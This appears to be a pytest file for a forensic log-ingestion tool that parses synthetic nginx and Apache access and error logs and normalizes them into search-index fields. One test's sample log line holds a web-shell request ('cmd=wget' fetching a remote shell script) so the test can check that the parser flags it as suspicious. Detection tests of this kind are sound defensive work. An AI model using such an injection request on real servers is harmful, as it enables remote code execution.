"""nginx (and shared Apache) web-server log parsing. All samples are synthetic."""
from __future__ import annotations

import json
from unittest.mock import MagicMock

import pytest

from app.core import opensearch as os_module
from app.ingest.artifact_normalizers import normalize_linux_row
from app.ingest.linux.apache import parse_apache
from app.ingest.linux.helpers import looks_like_linux_artifact
from app.ingest.normalizer import base_document

ACCESS_COMBINED = (
    '203.0.113.9 - - [01/Mar/2024:10:20:30 +0000] "GET /admin?id=1 HTTP/1.1" 403 153 "-" "curl/8.0"\n'
    '198.51.100.7 - alice [01/Mar/2024:10:20:31 +0100] "POST /login HTTP/2.0" 200 52 "https://example.test/" "Mozilla/5.0"\n'
)
ACCESS_BEHIND_LB = '192.0.2.10 - - [01/Mar/2024:10:20:30 +0000] "GET / HTTP/1.1" 200 12 "-" "Mozilla/5.0" "198.51.100.77, 192.0.2.10"\n'
NGINX_ERROR = (
    '2024/03/01 10:20:30 [error] 7#8: *1 open() "/usr/share/nginx/html/x" failed (2: No such file or directory), '
    'client: 203.0.113.9, server: example.test, request: "GET /x HTTP/1.1", host: "example.test"\n'
    '2024/03/01 10:20:31 [warn] 7#8: *2 upstream server temporarily disabled while connecting to upstream, '
    'client: 198.51.100.7, server: example.test, request: "POST /api HTTP/1.1", upstream: "http://127.0.0.1:9000/api", host: "example.test"\n'
    '2024/03/01 10:20:32 [emerg] 7#7: bind() to 0.0.0.0:80 failed (98: Address already in use)\n'
)
APACHE_ERROR = '[Fri Mar 01 10:20:30.123456 2024] [core:error] [pid 1234:tid 5678] [client 203.0.113.9:51234] AH00126: Invalid URI in request\n'


def _doc(row: dict) -> dict:
    base = base_document("case-1", "ev-1", "art-1", row, {"artifact_type": row["artifact_family"]})
    return normalize_linux_row(base, row, source_path=row["source_file"], artifact_type=row["artifact_family"])


# --------------------------------------------------------------------- detection

@pytest.mark.parametrize(
    "path, artifact_type",
    [
        ("var/log/nginx/access.log", "apache_access"),
        ("var/log/nginx/error.log", "apache_error"),
        ("var/log/nginx/access.log.3.gz", "apache_access"),
        ("var/log/nginx/shop.example.test.access.log", "apache_access"),
        ("var/log/nginx/shop-error.log.1", "apache_error"),
        ("evidence/web1/var/log/nginx/error.log", "apache_error"),
        ("var/log/apache2/access.log", "apache_access"),
    ],
)
def test_web_server_log_paths_are_detected(path, artifact_type):
    assert looks_like_linux_artifact(path) == ("linux_apache", artifact_type, "linux_apache_raw")


# ------------------------------------------------------------------ access logs

def test_combined_access_lines_parse_for_nginx():
    rows = parse_apache(ACCESS_COMBINED, source_path="var/log/nginx/access.log")
    assert len(rows) == 2
    first, second = rows
    assert first["timestamp"] == "2024-03-01T10:20:30+00:00"
    assert (first["source_ip"], first["http_method"], first["url_path"], first["http_status"]) == ("203.0.113.9", "GET", "/admin?id=1", 403)
    assert first["http_user_agent"] == "curl/8.0" and first["web_server"] == "nginx"
    assert first["x_forwarded_for"] == ""
    assert second["username"] == "alice" and second["http_protocol"] == "HTTP/2.0"
    assert second["timestamp"] == "2024-03-01T10:20:31+01:00"


def test_x_forwarded_for_keeps_the_real_client_behind_a_load_balancer():
    row = parse_apache(ACCESS_BEHIND_LB, source_path="var/log/nginx/access.log")[0]
    assert row["source_ip"] == "192.0.2.10"  # the proxy that connected
    assert row["x_forwarded_for"] == "198.51.100.77"  # the original client


@pytest.mark.parametrize("trailing", ['"0.003"', '"-"', '"not an address"', '"unknown, also unknown"'])
def test_other_trailing_quoted_fields_are_not_mistaken_for_a_client(trailing):
    line = '203.0.113.9 - - [01/Mar/2024:10:20:30 +0000] "GET / HTTP/1.1" 200 12 "-" "ua" ' + trailing
    assert parse_apache(line, source_path="var/log/nginx/access.log")[0]["x_forwarded_for"] == ""


def test_json_access_lines():
    lines = "\n".join(
        json.dumps(record)
        for record in (
            {"time_iso8601": "2024-03-01T10:20:30+00:00", "remote_addr": "203.0.113.9", "request": "GET /a?x=1 HTTP/1.1", "status": "404",
             "body_bytes_sent": "12", "http_user_agent": "ua/1", "http_referer": "-", "http_x_forwarded_for": "198.51.100.77, 192.0.2.10"},
            {"@timestamp": "2024-03-01T10:20:31Z", "client_ip": "198.51.100.7", "request_method": "POST", "uri": "/api", "status": 500},
        )
    )
    first, second = parse_apache(lines, source_path="var/log/nginx/access.json.log")
    assert first["timestamp"] == "2024-03-01T10:20:30+00:00" and first["log_format"] == "json"
    assert (first["source_ip"], first["http_method"], first["url_path"], first["http_status"], first["bytes_sent"]) == ("203.0.113.9", "GET", "/a?x=1", 404, 12)
    assert first["x_forwarded_for"] == "198.51.100.77" and first["http_user_agent"] == "ua/1"
    assert second["timestamp"] == "2024-03-01T10:20:31+00:00" and second["http_method"] == "POST" and second["url_path"] == "/api"


def test_malformed_json_and_unmatched_lines_do_not_fail():
    rows = parse_apache('{"broken": \nnot a log line at all\n', source_path="var/log/nginx/access.log")
    assert len(rows) == 2 and all(r["timestamp"] is None for r in rows)
    assert rows[1]["message"] == "not a log line at all"


def test_suspicious_request_indicators_apply_to_nginx_too():
    line = '203.0.113.9 - - [01/Mar/2024:10:20:30 +0000] "GET /x.php?cmd=wget%20http://203.0.113.9/s.sh HTTP/1.1" 200 5 "-" "-"'
    row = parse_apache(line, source_path="var/log/nginx/access.log")[0]
    assert {"cmd=", "wget "} <= set(row["suspicious_url_indicators"])


# -------------------------------------------------------------------- error logs

def test_nginx_error_lines_carry_their_context():
    first, second, third = parse_apache(NGINX_ERROR, source_path="var/log/nginx/error.log")
    assert first["timestamp"] == "2024-03-01T10:20:30+00:00" and first["timestamp_status"] == "assumed_utc"
    assert first["http_severity"] == "error" and first["process"] == "nginx" and first["pid"] == 7 and first["thread_id"] == 8
    assert (first["source_ip"], first["server_name"], first["http_host"]) == ("203.0.113.9", "example.test", "example.test")
    assert (first["http_method"], first["url_path"]) == ("GET", "/x")
    assert first["message"].startswith('*1 open() "/usr/share/nginx/html/x" failed') or first["message"].startswith("open()")
    assert second["upstream"] == "http://127.0.0.1:9000/api" and second["http_severity"] == "warn"
    # A startup error has no client/request context at all.
    assert third["http_severity"] == "emerg" and third["source_ip"] == "" and third["url_path"] == ""
    assert first["web_server"] == "nginx"


def test_apache_error_format_is_unchanged():
    row = parse_apache(APACHE_ERROR, source_path="var/log/apache2/error.log")[0]
    assert row["apache_module"] == "core" and row["http_severity"] == "error"
    assert row["source_ip"] == "203.0.113.9" and row["source_port"] == 51234
    assert row["web_server"] == "apache"


def test_apache_access_is_unchanged_and_tagged():
    row = parse_apache(ACCESS_COMBINED, source_path="var/log/apache2/access.log")[0]
    assert row["http_status"] == 403 and row["web_server"] == "apache"


def test_server_is_left_blank_when_the_path_does_not_say():
    row = parse_apache(ACCESS_COMBINED, source_path="var/log/custom/access.log")[0]
    assert row["web_server"] == ""


# ------------------------------------------------------------------- normalizing

def test_rows_normalize_to_search_fields():
    row = parse_apache(ACCESS_BEHIND_LB, source_path="var/log/nginx/access.log")[0]
    doc = _doc(row)
    assert doc["linux"]["web_server"] == "nginx" and doc["linux"]["x_forwarded_for"] == "198.51.100.77"
    assert doc["network"]["source_ip"] == "192.0.2.10"
    assert doc["http"]["request"]["method"] == "GET" and doc["http"]["response"]["status_code"] == 200
    assert doc["event"]["outcome"] == "success"


def test_nginx_error_normalizes_with_severity_and_server_name():
    doc = _doc(parse_apache(NGINX_ERROR, source_path="var/log/nginx/error.log")[0])
    assert doc["linux"]["server_name"] == "example.test" and doc["linux"]["timestamp_status"] == "assumed_utc"
    assert doc["event"]["type"] == "apache_error"


# --------------------------------------------------------------------- index map

@pytest.mark.parametrize("exists", [False, True], ids=["new-index", "existing-index-backfill"])
def test_new_web_fields_are_declared_in_the_index_mapping(monkeypatch, exists):
    client = MagicMock()
    monkeypatch.setattr(os_module, "get_opensearch_client", lambda **_: client)
    monkeypatch.setattr(os_module, "index_exists", lambda *_a, **_k: exists)
    monkeypatch.setattr(os_module, "_apply_safe_index_settings", lambda *_a, **_k: None, raising=False)
    os_module.ensure_case_index("11111111-1111-4111-8111-111111111111")
    call = client.indices.put_mapping if exists else client.indices.create
    body = call.call_args.kwargs["body"]
    properties = body.get("mappings", body)["properties"]["linux"]["properties"]
    assert {"web_server", "x_forwarded_for", "http_host"} <= set(properties)
